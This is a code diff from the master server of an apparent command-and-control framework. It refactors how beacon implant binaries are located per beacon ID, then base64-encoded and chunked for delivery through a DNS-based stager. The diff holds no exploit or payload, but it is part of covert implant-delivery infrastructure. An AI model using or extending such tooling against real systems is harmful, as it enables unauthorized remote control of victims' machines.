@@ -1085,30 +1085,50 @@ func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
 
 // Stager Management Handlers
 
-// handleListClientBinaries returns all stored client binaries from the builds directory
+// handleListClientBinaries returns all stored client binaries from the clients directory
 func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Request) {
-	// Derive builds directory from database path
+	// Derive clients directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/clients)
 	dbDir := filepath.Dir(api.config.DatabasePath)
-	buildsDir := filepath.Join(dbDir, "builds")
+	clientsDir := filepath.Join(dbDir, "clients")
 
-	// Find all beacon client files
-	files, err := filepath.Glob(filepath.Join(buildsDir, "beacon-*"))
+	// Read all beacon directories
+	entries, err := os.ReadDir(clientsDir)
 	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, "failed to search builds directory")
+		if os.IsNotExist(err) {
+			// Directory doesn't exist, return empty array
+			api.sendJSON(w, []map[string]interface{}{})
+			return
+		}
+		api.sendError(w, http.StatusInternalServerError, "failed to read clients directory")
 		return
 	}
 
-	// Build response with file info
+	// Build response with beacon info
 	var binaries []map[string]interface{}
-	for _, filePath := range files {
-		info, err := os.Stat(filePath)
+	for _, entry := range entries {
+		if !entry.IsDir() {
+			continue
+		}
+
+		beaconID := entry.Name()
+		beaconDir := filepath.Join(clientsDir, beaconID)
+
+		// Look for beacon binary in this directory (beacon-linux or beacon-windows*)
+		beaconFiles, err := filepath.Glob(filepath.Join(beaconDir, "beacon-*"))
+		if err != nil || len(beaconFiles) == 0 {
+			continue
+		}
+
+		// Use the first beacon file found
+		beaconPath := beaconFiles[0]
+		info, err := os.Stat(beaconPath)
 		if err != nil {
 			continue
 		}
 
-		filename := filepath.Base(filePath)
+		filename := filepath.Base(beaconPath)
 
-		// Parse OS from filename (beacon-linux-* or beacon-windows-*)
+		// Parse OS from filename (beacon-linux* or beacon-windows*)
 		var osType string
 		var arch string
 		if strings.HasPrefix(filename, "beacon-linux") {
@@ -1118,7 +1138,7 @@ func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Re
 			osType = "windows"
 			arch = "x64"
 		} else {
-			continue // Skip non-beacon files
+			continue
 		}
 
 		// Calculate compressed size estimate (rough estimate: 40% of original)
@@ -1129,7 +1149,7 @@ func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Re
 		totalChunks := (base64Size + 402) / 403
 
 		binary := map[string]interface{}{
-			"id":              filename,
+			"id":              beaconID,
 			"filename":        filename,
 			"os":              osType,
 			"arch":            arch,
@@ -1192,9 +1212,20 @@ type StagerInitResponse struct {
 }
 
 // loadAndProcessClientBinary loads a client binary from disk and processes it for stager deployment
+// Automatically finds the most appropriate beacon for the given OS/Arch
 // Returns: clientBinaryID, base64Data, totalChunks, error
 func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, string, int, error) {
-	// Determine client binary filename based on OS
+	// Derive clients directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/clients)
+	dbDir := filepath.Dir(api.config.DatabasePath) // /opt/unkn0wnc2
+	clientsDir := filepath.Join(dbDir, "clients")
+
+	// Read all beacon directories
+	entries, err := os.ReadDir(clientsDir)
+	if err != nil {
+		return "", "", 0, fmt.Errorf("failed to read clients directory: %w", err)
+	}
+
+	// Determine what we're looking for
 	var clientFilename string
 	if strings.ToLower(osType) == "windows" {
 		clientFilename = "beacon-windows"
@@ -1202,24 +1233,33 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 		clientFilename = "beacon-linux"
 	}
 
-	// Derive builds directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/builds)
-	dbDir := filepath.Dir(api.config.DatabasePath) // /opt/unkn0wnc2
-	buildsDir := filepath.Join(dbDir, "builds")
+	// Find first beacon matching OS
+	var clientPath string
+	var beaconID string
+	for _, entry := range entries {
+		if !entry.IsDir() {
+			continue
+		}
 
-	// Look for client builds matching OS
-	files, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
-	if err != nil {
-		return "", "", 0, fmt.Errorf("failed to search builds directory: %w", err)
+		beaconDir := filepath.Join(clientsDir, entry.Name())
+
+		// Look for beacon file in this directory
+		files, err := filepath.Glob(filepath.Join(beaconDir, clientFilename+"*"))
+		if err != nil || len(files) == 0 {
+			continue
+		}
+
+		// Found a matching beacon
+		clientPath = files[0]
+		beaconID = entry.Name()
+		break
 	}
 
-	if len(files) == 0 {
-		return "", "", 0, fmt.Errorf("no client binary found for %s/%s in %s", osType, arch, buildsDir)
+	if clientPath == "" {
+		return "", "", 0, fmt.Errorf("no beacon found for %s/%s in %s", osType, arch, clientsDir)
 	}
 
-	// Find most recent file (assume files are sorted by timestamp in filename)
-	clientPath := files[len(files)-1] // Get last (most recent) file
-
-	fmt.Printf("[Master] Loading client binary: %s\n", clientPath)
+	fmt.Printf("[Master] Loading client binary: %s (beacon ID: %s)\n", clientPath, beaconID)
 
 	// Read client binary
 	clientData, err := os.ReadFile(clientPath)
@@ -1253,10 +1293,7 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 
 	fmt.Printf("[Master] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)
 
-	// Use filename as ID
-	clientBinaryID := filepath.Base(clientPath)
-
-	return clientBinaryID, base64Data, totalChunks, nil
+	return beaconID, base64Data, totalChunks, nil
 }
 
 // handleStagerInit processes stager initialization (STG message forwarded from DNS server)
